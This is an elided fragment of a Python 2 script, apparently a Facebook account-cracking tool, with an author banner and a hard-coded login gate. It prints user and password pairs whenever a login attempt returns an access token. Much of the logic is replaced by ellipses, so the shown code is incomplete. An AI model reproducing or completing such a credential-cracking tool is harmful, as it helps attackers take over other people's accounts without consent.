...
oks = []
id = []
print 'AUTHOR : MR. TUTUL'
print 'FACEBOOK :Abal.Not.Allow.ok.Bro'
print 'GITHUB : Hackertutul'
CorrectUsername = 'LoVe.u.Tutul'
CorrectPassword = 'Ok.Bro'
loop = 'true'
while loop == 'true':
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Ok-Tutul-SUCCESSFUL]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n' + '\x1b[1;92m  [Login Now]\n'
